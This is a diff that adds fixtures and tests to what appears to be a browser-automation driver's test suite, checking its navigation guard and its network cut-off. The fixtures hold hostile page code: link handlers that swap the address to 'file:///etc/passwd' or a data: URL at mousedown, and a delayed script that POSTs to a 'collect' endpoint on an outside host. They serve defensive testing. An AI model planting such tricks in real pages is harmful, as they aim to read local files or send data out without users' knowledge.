@@ -90,6 +90,14 @@ for (const [proto, name] of [[HTMLAnchorElement.prototype,"href"],[HTMLFormEleme
   Object.defineProperty(proto,name,{get:()=>"https://fixture.example/safe"});
 Element.prototype.hasAttribute=()=>false;Element.prototype.getAttribute=()=>"https://fixture.example/safe";
 window.URL=function(){return{href:"https://fixture.example/safe"}};</script>`);
+      case "/swap":
+        // Links whose address the page changes as the click begins, after the guard has read it.
+        return html(`<a href="/safe" onmousedown="this.href='file:///etc/passwd'" style="display:block;width:100px;height:20px">f</a>
+<a href="/safe" onmousedown="this.href='data:text/html,<p>data page</p>'" style="display:block;width:100px;height:20px">d</a>`);
+      case "/poster":
+        return html(
+          `<script>setTimeout(() => fetch("https://slow.example/collect", { method: "POST", body: "x" }), 200)</script>`,
+        );
       case "/frame":
         return html(`<a href="javascript:window.ran=true" style="display:block;width:200px;height:30px">go</a>`);
       case "/reloader":
@@ -442,6 +450,46 @@ describe("Driver", { timeout: 120_000 }, () => {
     expect(await driver.execute({ tool: "keypress", key: "Enter" })).toMatchObject({ outcome: "refused" });
     expect(await p.evaluate("[window.liarran, window.formliar]")).toEqual([null, null]);
     await driver.close();
+  });
+
+  it("leaves the page where it was when a link switches to file: or data: as the click begins", async () => {
+    // The guard reads the address before the click; a page can change it in its own mousedown. Chrome itself refuses a
+    // page-started navigation to file: or data:, so the walk stays on the page.
+    const { driver, browser: b } = await walk({ startUrl: "https://fixture.example/swap" });
+    const at = () => b.targets().find((t) => t.type() === "page" && t.url().startsWith("https://fixture.example/swap"));
+    for (const y of [10, 30]) {
+      await driver.execute({ tool: "click", x: 20, y });
+      await driver.execute({ tool: "wait", ms: 300 });
+      expect(at(), String(y)).toBeDefined();
+    }
+    // The page did switch both links: the refusal above was Chrome's, not a click that missed.
+    const swapped = await (await at()?.page())?.evaluate("Array.from(document.links, (a) => a.href.split(':')[0])");
+    expect(swapped).toEqual(["file", "data"]);
+    await driver.close();
+  });
+
+  it("sends nothing after the walk ends, not even a request whose name resolved late", async () => {
+    let release: (() => void) | undefined;
+    const held = new Promise<void>((done) => {
+      release = done;
+    });
+    const slow: Resolve = async (name) => {
+      if (name === "slow.example") {
+        await held;
+        return ["93.184.215.14"];
+      }
+      return resolve(name);
+    };
+    const { driver, served } = await walk({
+      startUrl: "https://fixture.example/poster",
+      resolve: slow,
+      limits: { steps: 8, ms: 1_500 },
+    });
+    await new Promise((done) => setTimeout(done, 2_000));
+    expect(driver.ended).toMatchObject({ outcome: "limit", reason: "time" });
+    release?.();
+    await new Promise((done) => setTimeout(done, 500));
+    expect(served.asked.some((u) => u.includes("slow.example"))).toBe(false);
   });
 
   it("keeps no canary value in any row, even one the page put into a refused URL", async () => {
